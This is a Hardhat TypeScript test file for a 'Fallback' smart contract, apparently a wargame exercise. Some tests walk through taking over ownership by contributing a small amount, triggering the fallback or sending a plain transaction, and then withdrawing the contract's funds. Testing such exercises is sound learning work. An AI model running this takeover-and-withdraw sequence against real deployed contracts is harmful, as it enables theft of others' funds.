import { ethers } from 'hardhat';
import chai from 'chai';
import { Fallback__factory, Fallback } from '../../typechain';
import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/dist/src/signer-with-address';
import { ContractTransaction } from '@ethersproject/contracts';
import { BigNumber } from '@ethersproject/bignumber';

const { expect } = chai;

let fallback: Fallback;
let fallbackFactory: Fallback__factory;
let deployerWallet: SignerWithAddress;
let userWallet: SignerWithAddress;

describe('Fallback Tests', () => {
    beforeEach(async () => {
        [deployerWallet, userWallet] = await ethers.getSigners();

        fallbackFactory = (await ethers.getContractFactory(
            'Fallback',
            deployerWallet
        )) as Fallback__factory;

        fallback = (await fallbackFactory.deploy()) as Fallback;

        expect(fallback.address).to.be.properAddress;
    });

    const smallContribution: BigNumber = ethers.BigNumber.from('100000000000000');
    const takeoverownerContribution: BigNumber = ethers.BigNumber.from('1000000000000000000000');

    describe('Function tests', async () => {
        it('Deployer is owner', async () => {
            expect(await fallback.owner()).to.equal(deployerWallet.address);
        });

        it('User cannot withdraw', async () => {
            await expect(fallback.connect(userWallet).withdraw())
                .to.be.revertedWith('caller is not the owner');
        });

        it('User can contribute less than .001 ether', async () => {
            await fallback.connect(userWallet).contribute({ value: smallContribution });
            expect(await fallback.connect(userWallet).getContribution()).equal(smallContribution);
        });

        it('User cannot contribute greater than/exactly .001 ether', async () => {
            const toobigContribution: BigNumber = ethers.BigNumber.from('1000000000000000');
            await expect(fallback.connect(userWallet).contribute({ value: toobigContribution }))
                .to.be.revertedWith('');
        });

        it('Fallback cannot be called with no contributions', async () => {
            await expect(fallback.connect(userWallet).fallback({ value: takeoverownerContribution }))
                .to.be.revertedWith('');
        });

        it('SendTransaction (fallback) cannot be called with no contributions', async () => {
            await expect(userWallet.sendTransaction({ to: fallback.address, value: takeoverownerContribution }))
                .to.be.revertedWith('');
        });
    });

    describe('User becomes Owner by calling Fallback function', async () => {

        it('User contributes less than .001 ether, calls fallback, withdraws', async () => {
            // User contributes small amount
            await fallback.connect(userWallet).contribute({ value: smallContribution });
            expect(await fallback.connect(userWallet).getContribution()).equal(smallContribution);

            // User calls fallback function to become owner
            await fallback.connect(userWallet).fallback({ value: takeoverownerContribution });
            expect(await fallback.owner()).to.equal(userWallet.address);
  
            // User withdraws from contract
            const receipt: ContractTransaction = await fallback.connect(userWallet).withdraw();
            expect(receipt.from).to.equal(userWallet.address);
        });

    });

    describe('User becomes Owner with sendTransaction', async () => {

        it('User contributes less than .001 ether, calls sendTransaction, withdraws', async () => {
            // User contributes small amount
            await fallback.connect(userWallet).contribute({ value: smallContribution });
            expect(await fallback.connect(userWallet).getContribution()).equal(smallContribution);

            // User calls fallback function to become owner
            await userWallet.sendTransaction({ to: fallback.address, value: takeoverownerContribution });
            expect(await fallback.owner()).to.equal(userWallet.address);

            // User withdraws from contract
            const receipt: ContractTransaction = await fallback.connect(userWallet).withdraw();
            expect(receipt.from).to.equal(userWallet.address);
        });

    });

});


